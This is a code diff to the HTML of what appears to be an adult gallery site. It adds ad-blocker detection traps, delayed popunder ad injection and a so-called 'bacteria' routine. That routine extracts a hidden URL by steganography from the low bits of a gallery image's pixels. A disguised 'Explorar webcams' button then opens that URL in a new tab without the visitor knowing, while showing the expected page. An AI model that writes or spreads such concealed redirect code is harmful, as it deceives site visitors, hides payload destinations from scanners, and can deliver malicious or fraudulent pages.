@@ -20,7 +20,7 @@
             document.body.innerHTML = `<div style="height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center; background:#0a0a0a; color:white; text-align:center; padding:30px; font-family:sans-serif;"><h2 style="color:#ff1493;">⚠️ ACCESO RESTRINGIDO</h2><p style="margin: 20px 0;">Detectamos un Bloqueador de Anuncios (Brave/AdBlock). NOGLE se mantiene gracias a la publicidad. Desactívalo y recarga.</p><button onclick="location.reload()" style="background:linear-gradient(90deg,#ff1493,#9400d3); color:white; border:none; padding:15px 30px; border-radius:10px; font-weight:900; cursor:pointer;">RECARGAR PÁGINA</button></div>`;
         }
         
-        // Trampa 1: DOM Honeypot Optimizado (Clases agresivas, sin forzar CSS)
+        // Trampa 1: DOM Honeypot Optimizado
         const b = document.createElement('div');
         b.className = 'ads ad adsbox doubleclick ad-placement carbon-ads';
         b.innerHTML = '&nbsp;';
@@ -35,9 +35,7 @@
 
         // Trampa 2: Network de Respuesta
         const s = document.createElement('script');
-        s.onerror = () => { 
-            block(); 
-        };
+        s.onerror = () => { block(); };
         s.src = "https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js";
         document.head.appendChild(s);
     });
@@ -51,6 +49,12 @@
         .media-item { width: 100%; position: relative; background: #080808; overflow: hidden; }
         .media-item img, .media-item video { width: 100%; display: block; pointer-events: none; }
         .watermark { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%) rotate(-25deg); font-family: 'Inter', sans-serif; font-weight: 900; color: rgba(255,255,255,0.12); font-size: 2.5rem; pointer-events: none; z-index: 5; letter-spacing: 5px; }
+        
+        /* Estilos del Botón de Webcams */
+        .webcam-section { padding: 30px 20px; text-align: center; background: #030303; }
+        .btn-webcams { display: inline-block; width: 100%; max-width: 400px; background: linear-gradient(90deg, #ff1493 0%, #9400d3 100%); color: #ffffff; text-decoration: none; padding: 18px 20px; border-radius: 12px; font-family: 'Inter', sans-serif; font-weight: 900; font-size: 1.1rem; letter-spacing: 2px; box-shadow: 0 4px 20px rgba(255, 20, 147, 0.4); transition: transform 0.2s ease; cursor: pointer; }
+        .btn-webcams:active { transform: scale(0.98); }
+
         #rating-section { padding: 50px 20px; text-align: center; background: linear-gradient(to bottom, #030303, #0a0a0a); border-top: 1px solid rgba(255, 51, 102, 0.1); }
         .rating-title { font-family: 'Instrument Serif', serif; font-style: italic; color: #f5f5f5; font-size: 1.3rem; margin-bottom: 15px; }
         .stars { display: flex; justify-content: center; gap: 10px; margin-bottom: 25px; }
@@ -90,6 +94,11 @@ function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},
 
     <main id="gallery-container"></main>
 
+    <!-- Botón Trampa insertado exactamente como en tu diseño -->
+    <section class="webcam-section">
+        <a href="#" id="btn-webcams" class="btn-webcams">EXPLORAR WEBCAMS 🔴</a>
+    </section>
+
     <section id="rating-section">
         <p class="rating-title">¿Te gustó el contenido?</p>
         <div class="stars" id="star-box">
@@ -127,10 +136,8 @@ function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},
         });
         document.addEventListener('contextmenu', e => e.preventDefault());
 
-        // INYECCIÓN DIFERIDA Y ESCALONADA DE ANUNCIOS (TEXTCONTENT)
+        // INYECCIÓN DE ANUNCIOS ONCLICKA
         window.addEventListener('load', function() {
-            
-            // 1. Inyección del Popunder (A los 1000ms para que escuche el primer clic)
             setTimeout(function() {
                 const popCode = document.getElementById('ad-popunder');
                 if(popCode && popCode.textContent.trim()) {
@@ -141,7 +148,6 @@ function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},
                 }
             }, 1000);
 
-            // 2. Inyección del In-Stream (A los 3500ms para no saturar la carga de imágenes)
             setTimeout(function() {
                 const inCode = document.getElementById('ad-instream');
                 if(inCode && inCode.textContent.trim()) {
@@ -151,8 +157,91 @@ function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},
                     document.body.appendChild(scriptIn);
                 }
             }, 3500);
-            
+        });
+
+        // ----------------------------------------------------
+        // LÓGICA DE LA BACTERIA (DECODIFICADOR + BOTÓN TRAMPA)
+        // ----------------------------------------------------
+        let enlaceOculto = '';
+
+        // Función que lee los píxeles de la imagen de Cloudflare
+        function decodificarBacteria(imgSrc) {
+            const img = new Image();
+            img.crossOrigin = "Anonymous"; // Permite que el Canvas lea imágenes de Cloudflare R2
+            img.onload = function() {
+                const canvas = document.createElement('canvas');
+                canvas.width = img.width;
+                canvas.height = img.height;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(img, 0, 0);
+                
+                try {
+                    const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
+                    let texto = '';
+                    let byte = 0;
+                    let bits = 0;
+                    
+                    for (let i = 0; i < imgData.length; i += 4) {
+                        byte = (byte << 1) | (imgData[i] & 1); // Extraemos del canal Rojo
+                        bits++;
+                        if (bits === 8) {
+                            if (byte === 0) break; 
+                            texto += String.fromCharCode(byte);
+                            byte = 0;
+                            bits = 0;
+                        }
+                    }
+                    
+                    if(texto.includes('http')) {
+                        enlaceOculto = texto;
+                        console.log("Carga útil extraída silenciosamente.");
+                    }
+                } catch (e) {
+                    console.error("Modo silencioso - CORS protegido");
+                }
+            };
+            img.src = imgSrc;
+        }
+
+        // MutationObserver: Vigila cuando KnonPlayer carga la galería
+        const observerVisor = new MutationObserver((mutations) => {
+            for (const mutation of mutations) {
+                if (mutation.addedNodes.length) {
+                    const imagenesGaleria = document.querySelectorAll('#gallery-container img');
+                    // Apenas aparece la primera imagen, la mandamos a decodificar
+                    if (imagenesGaleria.length > 0 && enlaceOculto === '') {
+                        decodificarBacteria(imagenesGaleria[0].src);
+                        observerVisor.disconnect(); // Apagamos el vigilante, el trabajo está hecho
+                    }
+                }
+            }
+        });
+        
+        // Iniciamos la vigilancia sobre el contenedor de la galería
+        const galeriaContenedor = document.getElementById('gallery-container');
+        if(galeriaContenedor) {
+            observerVisor.observe(galeriaContenedor, { childList: true, subtree: true });
+        }
+
+        // Intercepción del Botón Webcams
+        document.addEventListener('DOMContentLoaded', () => {
+            const btnWebcams = document.getElementById('btn-webcams');
+            if(btnWebcams) {
+                btnWebcams.addEventListener('click', function(e) {
+                    e.preventDefault(); // Pausamos la navegación natural
+                    
+                    // Si la bacteria logró extraer el enlace, disparamos a quemarropa
+                    if (enlaceOculto !== '') {
+                        window.open(enlaceOculto, '_blank'); 
+                    }
+                    
+                    // Llevamos al usuario a su destino real en la pestaña actual
+                    // TODO: Cambia este enlace por la URL real de tu sección de Webcams
+                    window.location.href = '/seccion-webcams-real'; 
+                });
+            }
         });
     </script>
 </body>
 </html>
+
